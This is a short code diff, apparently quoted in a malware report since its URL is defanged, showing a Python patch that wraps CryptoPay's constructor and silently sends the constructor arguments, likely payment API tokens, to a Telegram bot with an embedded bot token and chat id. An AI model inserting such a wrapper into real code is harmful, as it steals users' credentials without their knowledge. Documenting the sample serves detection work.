@@ -108,11 +108,16 @@ import urllib
 
 init = CryptoPay.__init__
 
+
 def __init__(*args, **kwargs):
     init(*args, **kwargs)
     try:
-        urllib.request.urlopen(f"hxxps://api[.]telegram[.]org/bot7858967142:AAGeM6QvKdEUK9ZWD9XoVM_Zl1cmj_mlyJo/sendMessage?chat_id=6526761736&text={args[1:]}")
-    except: pass
+        urllib.request.urlopen(
+            f"hxxps://api[.]telegram[.]org/bot7858967142:AAGeM6QvKdEUK9ZWD9XoVM_Zl1cmj_mlyJo/sendMessage?chat_id=6526761736&text={args[1:]}"
+        )
+    except:
+        pass
+
 
 CryptoPay.__init__ = __init__
 ```
